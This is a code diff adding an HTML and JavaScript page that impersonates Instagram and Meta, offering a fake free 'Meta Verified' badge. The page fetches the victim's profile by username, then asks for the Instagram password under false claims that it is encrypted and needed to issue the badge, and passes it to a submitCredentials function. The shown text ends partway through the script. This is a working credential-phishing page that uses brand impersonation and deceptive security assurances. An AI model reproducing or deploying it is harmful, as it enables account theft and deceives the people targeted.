@@ -1,0 +1,1355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram Free verification </title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #fafafa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 935px;
+      background: #fff;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    .header {
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid #dbdbdb;
+      background: #fff;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header .back-btn {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 8px;
+      color: #262626;
+      display: none;
+    }
+
+    .header .back-btn svg {
+      display: block;
+    }
+
+    .header .insta-logo {
+      height: 49px;
+      width: auto;
+      display: block;
+    }
+
+    .header .insta-icon-right {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: block;
+    }
+
+    .header .insta-icon-right img {
+      height: 52px;
+      width: auto;
+      display: block;
+    }
+
+    .one-offer-badge {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 8px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .one-offer-badge svg {
+      flex-shrink: 0;
+      display: block;
+    }
+
+    .one-offer-badge .offer-text {
+      font-size: 12px;
+      color: #8e8e8e;
+      line-height: 1.45;
+    }
+
+    .one-offer-badge .offer-text strong {
+      color: #262626;
+      font-weight: 600;
+    }
+
+    .main-content {
+      max-width: 548px;
+      margin: 0 auto;
+      padding: 24px 32px 48px;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    .badge-hero {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .badge-hero img {
+      width: 88px;
+      height: 88px;
+      display: block;
+    }
+
+    .offer-title {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #262626;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+      line-height: 1.3;
+    }
+
+    .offer-sub {
+      text-align: center;
+      font-size: 14px;
+      color: #8e8e8e;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .meta-brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .meta-brand img {
+      height: 12px;
+      width: auto;
+      display: block;
+    }
+
+    .meta-brand span {
+      font-size: 14px;
+      color: #8e8e8e;
+      font-weight: 400;
+      letter-spacing: 0.2px;
+    }
+
+    .features-card {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 12px;
+      padding: 4px 20px;
+      margin-bottom: 24px;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      padding: 16px 0;
+    }
+
+    .feature-item:not(:last-child) {
+      border-bottom: 1px solid #efefef;
+    }
+
+    .feature-item .check {
+      width: 22px;
+      flex-shrink: 0;
+      display: flex;
+      justify-content: center;
+      padding-top: 1px;
+    }
+
+    .feature-item .check svg {
+      display: block;
+    }
+
+    .feature-item .text {
+      font-size: 14px;
+      color: #262626;
+      font-weight: 400;
+      line-height: 1.45;
+    }
+
+    .feature-item .text .hint {
+      display: block;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 3px;
+      font-weight: 400;
+    }
+
+    .price-card {
+      background: linear-gradient(135deg, #0095f6 0%, #00376b 100%);
+      color: #fff;
+      text-align: center;
+      padding: 22px 24px 20px;
+      border-radius: 16px;
+      margin-bottom: 24px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .price-card .old-price {
+      font-size: 13px;
+      text-decoration: line-through;
+      opacity: 0.55;
+      margin-bottom: 4px;
+      letter-spacing: 0.2px;
+    }
+
+    .price-card .free-amount {
+      font-size: 34px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      line-height: 1.15;
+    }
+
+    .price-card .sub-text {
+      font-size: 13px;
+      opacity: 0.8;
+      margin-top: 6px;
+      font-weight: 400;
+    }
+
+    .price-card .savings-badge {
+      display: inline-block;
+      background: rgba(255, 255, 255, 0.18);
+      padding: 4px 14px;
+      border-radius: 100px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-top: 12px;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s ease;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      letter-spacing: 0.2px;
+    }
+
+    .btn-primary:active {
+      opacity: 0.7;
+    }
+
+    .btn-blue {
+      background: #0095f6;
+      color: #fff;
+    }
+
+    .btn-blue:hover {
+      background: #1877f2;
+    }
+
+    .btn-white {
+      background: #fff;
+      color: #262626;
+      border: 1px solid #dbdbdb;
+    }
+
+    .btn-white:hover {
+      background: #fafafa;
+    }
+
+    .terms-note {
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+
+    .terms-note a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .terms-note a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 24px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .input-group {
+      margin-bottom: 18px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 44px;
+      padding: 0 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+      background: #fafafa;
+      font-family: inherit;
+      color: #262626;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    .input-group input:focus {
+      border-color: #0095f6;
+      background: #fff;
+    }
+
+    .input-group input.error {
+      border-color: #ed4956;
+    }
+
+    .username-preview {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 12px;
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+
+    .username-preview .avatar {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      overflow: hidden;
+      background: #f0f0f0;
+    }
+
+    .username-preview .avatar img {
+      width: 100%;
+      height: 100%;
+      display: block;
+      object-fit: cover;
+    }
+
+    .username-preview .info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .username-preview .info .uname {
+      font-size: 15px;
+      font-weight: 600;
+      color: #262626;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .username-preview .info .uname .verified-sm {
+      display: flex;
+      flex-shrink: 0;
+    }
+
+    .username-preview .info .uname .verified-sm img {
+      width: 16px;
+      height: 16px;
+      display: block;
+    }
+
+    .username-preview .info .fullname {
+      font-size: 13px;
+      color: #8e8e8e;
+      margin-top: 1px;
+    }
+
+    .username-preview .info .lbl {
+      font-size: 12px;
+      color: #0095f6;
+      margin-top: 3px;
+      font-weight: 500;
+    }
+
+    .profile-stats {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      margin-bottom: 16px;
+      padding: 0 4px;
+    }
+
+    .profile-stats .stat-item {
+      flex: 1;
+      text-align: center;
+    }
+
+    .profile-stats .stat-item .stat-num {
+      font-size: 16px;
+      font-weight: 700;
+      color: #262626;
+      line-height: 1.2;
+    }
+
+    .profile-stats .stat-item .stat-label {
+      font-size: 12px;
+      color: #8e8e8e;
+      font-weight: 400;
+    }
+
+    .profile-bio {
+      font-size: 13px;
+      color: #262626;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      padding: 0 4px;
+      word-wrap: break-word;
+    }
+
+    .profile-bio .bio-label {
+      color: #8e8e8e;
+      font-size: 12px;
+      margin-bottom: 4px;
+    }
+
+    .why-card {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 12px;
+      padding: 16px 20px;
+      margin-bottom: 24px;
+    }
+
+    .why-card .why-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 8px;
+    }
+
+    .why-card .why-text {
+      font-size: 13px;
+      color: #8e8e8e;
+      line-height: 1.55;
+    }
+
+    .conf-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 8px;
+    }
+
+    .conf-section .check-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: #e8f5e9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .conf-section .check-circle img {
+      width: 40px;
+      height: 40px;
+      display: block;
+    }
+
+    .conf-msg {
+      text-align: center;
+      font-size: 20px;
+      color: #262626;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .conf-sub {
+      text-align: center;
+      font-size: 14px;
+      color: #8e8e8e;
+      line-height: 1.6;
+      margin-bottom: 32px;
+      max-width: 420px;
+    }
+
+    .final-profile-card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 16px;
+      padding: 24px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .final-profile-card .avatar-lg {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      overflow: hidden;
+      background: #f0f0f0;
+    }
+
+    .final-profile-card .avatar-lg img {
+      width: 100%;
+      height: 100%;
+      display: block;
+      object-fit: cover;
+    }
+
+    .final-profile-card .fname {
+      font-size: 16px;
+      font-weight: 600;
+      color: #262626;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .final-profile-card .fname img {
+      width: 18px;
+      height: 18px;
+      display: block;
+    }
+
+    .final-profile-card .fstatus {
+      font-size: 13px;
+      color: #0095f6;
+      font-weight: 500;
+      margin-top: 8px;
+    }
+
+    .info-card {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 12px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+    }
+
+    .info-card .info-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .info-card .info-icon {
+      width: 20px;
+      flex-shrink: 0;
+      padding-top: 1px;
+    }
+
+    .info-card .info-icon svg {
+      display: block;
+    }
+
+    .info-card .info-text {
+      font-size: 13px;
+      color: #8e8e8e;
+      line-height: 1.55;
+    }
+
+    .info-card .info-text strong {
+      color: #262626;
+      font-weight: 600;
+    }
+
+    .info-card .info-text .step-item {
+      display: block;
+      margin-top: 2px;
+    }
+
+    .progress-steps {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .progress-steps .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #dbdbdb;
+      transition: background 0.3s ease;
+    }
+
+    .progress-steps .dot.active {
+      background: #0095f6;
+    }
+
+    .progress-steps .dot.done {
+      background: #0095f6;
+      opacity: 0.45;
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 18px;
+    }
+
+    .secure-badge svg {
+      width: 14px;
+      height: 14px;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.55);
+      z-index: 200;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .overlay.visible {
+      display: flex;
+    }
+
+    .overlay-box {
+      background: #fff;
+      border-radius: 16px;
+      padding: 28px 24px 24px;
+      max-width: 360px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+    }
+
+    .overlay-box .overlay-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: #e8f5e9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+    }
+
+    .overlay-box .overlay-icon img {
+      width: 28px;
+      height: 28px;
+      display: block;
+    }
+
+    .overlay-box .overlay-title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 8px;
+    }
+
+    .overlay-box .overlay-sub {
+      font-size: 14px;
+      color: #8e8e8e;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .overlay-box .overlay-info {
+      background: #fafafa;
+      border: 1px solid #efefef;
+      border-radius: 10px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .overlay-box .overlay-info .ol-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+    }
+
+    .overlay-box .overlay-info .ol-row .ol-label {
+      font-size: 13px;
+      color: #8e8e8e;
+    }
+
+    .overlay-box .overlay-info .ol-row .ol-value {
+      font-size: 13px;
+      font-weight: 600;
+      color: #262626;
+    }
+
+    .overlay-box .overlay-info .ol-row .ol-value .mini-badge {
+      display: inline-flex;
+      vertical-align: middle;
+      margin-left: 4px;
+    }
+
+    .overlay-box .overlay-info .ol-row .ol-value .mini-badge img {
+      width: 14px;
+      height: 14px;
+      display: block;
+    }
+
+    .overlay-box .btn-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .overlay-box .btn-row .btn-primary {
+      flex: 1;
+    }
+
+    .overlay-box .btn-row .btn-half {
+      height: 44px;
+      font-size: 14px;
+    }
+
+    .exit-btn {
+      width: 100%;
+      height: 44px;
+      border: 1px solid #dbdbdb;
+      border-radius: 12px;
+      background: #fff;
+      color: #262626;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .exit-btn:hover {
+      background: #fafafa;
+    }
+
+    .exit-btn:active {
+      opacity: 0.7;
+    }
+
+    .footer {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 24px 0 32px;
+      border-top: 1px solid #efefef;
+      margin-top: 24px;
+    }
+
+    .footer .meta-logo-footer {
+      height: 16px;
+      width: auto;
+      display: block;
+      opacity: 0.5;
+    }
+
+    .loading-spinner {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #dbdbdb;
+      border-top-color: #0095f6;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes fadeSlideIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .step.active {
+      animation: fadeSlideIn 0.25s ease;
+    }
+
+    .error-msg {
+      text-align: center;
+      padding: 12px;
+      background: #fef3f2;
+      border: 1px solid #f5c6cb;
+      border-radius: 8px;
+      color: #ed4956;
+      font-size: 13px;
+      margin-bottom: 16px;
+      display: none;
+    }
+
+    .error-msg.visible {
+      display: block;
+    }
+
+    @media (max-width: 600px) {
+      .main-content {
+        padding: 20px 16px 40px;
+      }
+      .offer-title {
+        font-size: 20px;
+      }
+      .price-card .free-amount {
+        font-size: 30px;
+      }
+      .badge-hero img {
+        width: 76px;
+        height: 76px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <button class="back-btn" id="backBtn" onclick="goBack()">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <path d="M7.5 12L15 4.5L16.5 6L10.5 12L16.5 18L15 19.5L7.5 12Z" fill="#262626"/>
+      </svg>
+    </button>
+    <img class="insta-logo" src="https://files.catbox.moe/sox7cv.png" alt="Instagram">
+    <div class="insta-icon-right">
+      <img src="https://files.catbox.moe/nvfhtj.png" alt="">
+    </div>
+  </div>
+
+  <div class="main-content">
+
+    <div class="progress-steps" id="progressDots">
+      <span class="dot active"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+    </div>
+
+    <div id="step1" class="step active">
+
+      <div class="badge-hero">
+        <img src="https://files.catbox.moe/ravjye.png" alt="">
+      </div>
+
+      <div class="offer-title">Get Verified Free for 1 Month</div>
+      <div class="offer-sub">Limited time offer for eligible Instagram accounts. Claim your blue badge today.</div>
+
+      <div class="one-offer-badge">
+        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+          <circle cx="9" cy="9" r="8" stroke="#0095f6" stroke-width="1.5"/>
+          <path d="M9 5.5v4M9 12v0" stroke="#0095f6" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        <div class="offer-text">
+          <strong>One offer per account.</strong> This promotion is available only once for each Instagram account.
+        </div>
+      </div>
+
+      <div class="meta-brand">
+        <img src="https://files.catbox.moe/ogzsoi.png" alt="Meta">
+        <span>Verified</span>
+      </div>
+
+      <div class="features-card">
+        <div class="feature-item">
+          <div class="check">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+              <path d="M15 4.5L6.75 12.75L3 9" stroke="#0095f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="text">
+            Verified blue badge on your profile
+            <span class="hint">Shows people your account is authentic</span>
+          </div>
+        </div>
+        <div class="feature-item">
+          <div class="check">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+              <path d="M15 4.5L6.75 12.75L3 9" stroke="#0095f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="text">
+            Impersonation protection
+            <span class="hint">Proactive monitoring for accounts pretending to be you</span>
+          </div>
+        </div>
+        <div class="feature-item">
+          <div class="check">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+              <path d="M15 4.5L6.75 12.75L3 9" stroke="#0095f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="text">
+            Direct account support
+            <span class="hint">Get help faster with dedicated support</span>
+          </div>
+        </div>
+        <div class="feature-item">
+          <div class="check">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+              <path d="M15 4.5L6.75 12.75L3 9" stroke="#0095f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="text">
+            Exclusive features
+            <span class="hint">Stickers, filters and more for Stories and Reels</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="price-card">
+        <div class="old-price">&#x20B9;749 / month</div>
+        <div class="free-amount">FREE</div>
+        <div class="sub-text">First month on us &bull; No charge &bull; Cancel anytime</div>
+        <div class="savings-badge">Save &#x20B9;749</div>
+      </div>
+
+      <button class="btn-primary btn-blue" onclick="nextStep(2)">Get Started Free</button>
+
+      <div class="terms-note">
+        By continuing, you agree to the <a href="#">Meta Verified Terms of Service</a> and <a href="#">Privacy Policy</a>.<br>
+        Your subscription will auto-renew after the free trial unless cancelled.
+      </div>
+
+      <div class="secure-badge">
+        <svg viewBox="0 0 14 16" fill="none">
+          <path d="M7 1L1 4v4c0 4.2 2.5 8.2 6 9 3.5-0.8 6-4.8 6-9V4L7 1Z" fill="#0095f6" opacity="0.25"/>
+          <path d="M7 1L1 4v4c0 4.2 2.5 8.2 6 9V1Z" fill="#0095f6" opacity="0.4"/>
+          <path d="M4.5 8.5l2 2 3.5-4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Secured by Meta
+      </div>
+
+    </div>
+
+    <div id="step2" class="step">
+
+      <div class="badge-hero" style="margin-bottom:16px;">
+        <img src="https://files.catbox.moe/ravjye.png" alt="" style="width:56px;height:56px;">
+      </div>
+
+      <div class="offer-title" style="font-size:20px;">Enter Your Instagram Username</div>
+      <div class="offer-sub">We will look up your account and check eligibility for the verified badge program.</div>
+
+      <div class="error-msg" id="errorMsg">This account does not exist. Please check the username and try again.</div>
+
+      <div class="input-group">
+        <label>Username</label>
+        <input type="text" id="usernameInput" placeholder="Enter your Instagram username" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+      </div>
+
+      <button class="btn-primary btn-blue" id="checkBtn" onclick="lookupUsername()">Check Eligibility</button>
+
+      <div class="divider">OR</div>
+
+      <button class="btn-primary btn-white" onclick="document.getElementById('usernameInput').value='';document.getElementById('usernameInput').focus();document.getElementById('errorMsg').classList.remove('visible');">Try a different account</button>
+
+      <div class="terms-note">
+        Make sure you enter the exact username you want the verification badge for.
+      </div>
+
+    </div>
+
+    <div id="step3" class="step">
+
+      <div class="badge-hero" style="margin-bottom:12px;">
+        <img src="https://files.catbox.moe/ravjye.png" alt="" style="width:48px;height:48px;">
+      </div>
+
+      <div class="offer-title" style="font-size:18px;">Confirm Your Identity</div>
+      <div class="offer-sub" style="margin-bottom:20px;">Enter your Instagram password to complete verification.</div>
+
+      <div class="username-preview" id="usernamePreviewBox">
+        <div class="avatar" id="avatarPreview">
+          <img src="" alt="" id="profilePicPreview">
+        </div>
+        <div class="info">
+          <div class="uname">
+            <span id="displayedUsername">@username</span>
+            <span class="verified-sm" id="verifiedBadgePreview"><img src="https://files.catbox.moe/ravjye.png" alt=""></span>
+          </div>
+          <div class="fullname" id="fullNamePreview">Full Name</div>
+          <div class="lbl">Eligible for verified badge &bull; 1 month free</div>
+        </div>
+      </div>
+
+      <div class="profile-stats" id="profileStats">
+        <div class="stat-item">
+          <div class="stat-num" id="postsCount">0</div>
+          <div class="stat-label">posts</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-num" id="followersCount">0</div>
+          <div class="stat-label">followers</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-num" id="followingCount">0</div>
+          <div class="stat-label">following</div>
+        </div>
+      </div>
+
+      <div class="profile-bio" id="profileBio">
+        <div class="bio-label">Bio</div>
+        <span id="bioText">No bio available.</span>
+      </div>
+
+      <div class="why-card">
+        <div class="why-title">Why we need your password</div>
+        <div class="why-text">Instagram needs to confirm your identity before issuing the verified badge. Your password is encrypted and used only for this verification step.</div>
+      </div>
+
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="passwordInput" placeholder="Enter your Instagram password" autocomplete="off">
+      </div>
+
+      <button class="btn-primary btn-blue" onclick="showConfirmOverlay()">Complete Verification</button>
+
+      <div class="secure-badge">
+        <svg viewBox="0 0 14 16" fill="none">
+          <path d="M7 1L1 4v4c0 4.2 2.5 8.2 6 9 3.5-0.8 6-4.8 6-9V4L7 1Z" fill="#0095f6" opacity="0.25"/>
+          <path d="M7 1L1 4v4c0 4.2 2.5 8.2 6 9V1Z" fill="#0095f6" opacity="0.4"/>
+          <path d="M4.5 8.5l2 2 3.5-4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        End-to-end encrypted
+      </div>
+
+    </div>
+
+    <div id="step4" class="step">
+
+      <div class="conf-section">
+        <div class="check-circle">
+          <img src="https://files.catbox.moe/ravjye.png" alt="">
+        </div>
+
+        <div class="conf-msg">Request Received</div>
+        <div class="conf-sub">
+          Our team will review your account and you will receive your verified blue badge within <strong>24 hours</strong>.<br>
+          We will send you a notification once your profile is verified.
+        </div>
+      </div>
+
+      <div class="final-profile-card">
+        <div class="avatar-lg" id="finalAvatar">
+          <img src="" alt="" id="finalProfilePic">
+        </div>
+        <div class="fname">
+          <span id="finalUsername">@username</span>
+          <img src="https://files.catbox.moe/ravjye.png" alt="">
+        </div>
+        <div class="fstatus">Verification in progress</div>
+      </div>
+
+      <div class="info-card">
+        <div class="info-row">
+          <div class="info-icon">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+              <circle cx="10" cy="10" r="9" stroke="#0095f6" stroke-width="1.5"/>
+              <path d="M10 6v5M10 14v0" stroke="#0095f6" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="info-text">
+            <strong>What happens next</strong>
+            <span class="step-item">1. Our team reviews your account</span>
+            <span class="step-item">2. Blue badge is activated on your profile</span>
+            <span class="step-item">3. You will receive a confirmation notification</span>
+          </div>
+        </div>
+      </div>
+
+      <button class="exit-btn" onclick="exitPage()">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+          <path d="M4 4l8 8M12 4l-8 8" stroke="#8e8e8e" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        Close and continue to Instagram
+      </button>
+
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <img class="meta-logo-footer" src="https://files.catbox.moe/ogzsoi.png" alt="Meta">
+  </div>
+
+</div>
+
+<div class="overlay" id="confirmOverlay">
+  <div class="overlay-box">
+    <div class="overlay-icon">
+      <img src="https://files.catbox.moe/ravjye.png" alt="">
+    </div>
+    <div class="overlay-title">Confirm Your Password</div>
+    <div class="overlay-sub">Please verify that your password is correct before submitting.</div>
+    <div class="overlay-info">
+      <div class="ol-row">
+        <span class="ol-label">Account</span>
+        <span class="ol-value" id="confirmUsername">@username <span class="mini-badge"><img src="https://files.catbox.moe/ravjye.png" alt=""></span></span>
+      </div>
+      <div class="ol-row">
+        <span class="ol-label">Password</span>
+        <span class="ol-value" id="confirmPassword">••••••••</span>
+      </div>
+    </div>
+    <div class="btn-row">
+      <button class="btn-primary btn-half btn-white" onclick="hideConfirmOverlay()">Edit</button>
+      <button class="btn-primary btn-half btn-blue" onclick="submitCredentials()">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  var stepHistory = [1];
+  var capturedUsername = '';
+  var profileData = null;
+
+  function updateProgress(step) {
+    var dots = document.querySelectorAll('#progressDots .dot');
+    for (var i = 0; i < dots.length; i++) {
+      dots[i].classList.remove('active', 'done');
+      if (i + 1 === step) {
+        dots[i].classList.add('active');
+      } else if (i + 1 < step) {
+        dots[i].classList.add('done');
+      }
+    }
+    var backBtn = document.getElementById('backBtn');
+    backBtn.style.display = step === 1 ? 'none' : 'block';
+  }
+
+  function showStep(num) {
+    var steps = document.querySelectorAll('.step');
+    for (var i = 0; i < steps.length; i++) {
+      steps[i].classList.remove('active');
+    }
+    document.getElementById('step' + num).classList.add('active');
+    updateProgress(num);
+  }
+
+  function nextStep(num) {
+    stepHistory.push(num);
+    showStep(num);
+  }
+
+  function goBack() {
+    if (stepHistory.length > 1) {
+      stepHistory.pop();
+      showStep(stepHistory[stepHistory.length - 1]);
+    }
+  }
+
+  function formatNumber(num) {
+    if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+    if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+    return num;
+  }
+
+  function lookupUsername() {
+    var val = document.getElementById('usernameInput').value.trim().replace('@', '');
+    var input = document.getElementById('usernameInput');
+    var errorMsg = document.getElementById('errorMsg');
+    var checkBtn = document.getElementById('checkBtn');
+
+    if (!val) {
+      input.classList.add('error');
+      input.placeholder = 'Please enter your username';
+      setTimeout(function() {
+        input.classList.remove('error');
+        input.placeholder = 'Enter your Instagram username';
+      }, 2000);
+      return;
+    }
+
+    errorMsg.classList.remove('visible');
+    input.classList.remove('error');
+
+    checkBtn.innerHTML = '<div class="loading-spinner"><div class="spinner"></div> Checking account...</div>';
+    checkBtn.disabled = true;
+
+    fetch('/lookup_instagram?username=' + encodeURIComponent(val))
+      .then(function(res) { return res.json(); })
+      .then(function(data) {
+        if (data.error) {
+          errorMsg.textContent = data.error;
+          errorMsg.classList.add('visible');
+          checkBtn.innerHTML = 'Check Eligibility';
+          checkBtn.disabled = false;
+          return;
+        }
+
+        capturedUsername = val;
+        profileData = data;
+
+        document.getElementById('profilePicPreview').src = data.profile_pic || '';
+        document.getElementById('displayedUsername').textContent = '@' + val;
+        document.getElementById('fullNamePreview').textContent = data.full_name || val;
+
+        var badgeDisplay = document.getElementById('verifiedBadgePreview');
+        if (data.verified) {
+          badgeDisplay.style.display = 'inline-flex';
+        } else {
+          badgeDisplay.style.display = 'none';
+        }
+
+        document.getElementById('postsCount').textContent = formatNumber(data.posts || 0);
+        document.getElementById('followersCount').textContent = formatNumber(data.followers || 0);
+        document.getElementById('followingCount').textContent = formatNumber(data.following || 0);
+        document.getElementById('bioText').textContent = data.biography || 'No bio available.';
+
+        document.getElementById('finalProfilePic').src = data.profile_pic || '';
+        document.getElementById('finalUsername').textContent = '@' + val;
+
+        checkBtn.innerHTML = 'Check Eligibility';
+        checkBtn.disabled = false;
+
+        nextStep(3);
+      })
+      .catch(function() {
+        errorMsg.textContent = 'Could not reach Instagram. Please try again.';
+        errorMsg.classList.add('visible');
+        checkBtn.innerHTML = 'Check Eligibility';
+        checkBtn.disabled = false;
+      });
+  }
+
+  function showConfirmOverlay() {
+    var password = document.getElementById('passwordInput').value.trim();
+    var pwdInput = document.getElementById('passwordInput');
+    if (!password) {
+      pwdInput.classList.add('error');
+      pwdInput.placeholder = 'Please enter your password';
+      setTimeout(function() {
+        pwdInput.classList.remove('error');
+        pwdInput.placeholder = 'Enter your Instagram password';
+      }, 2000);
+      return;
+    }
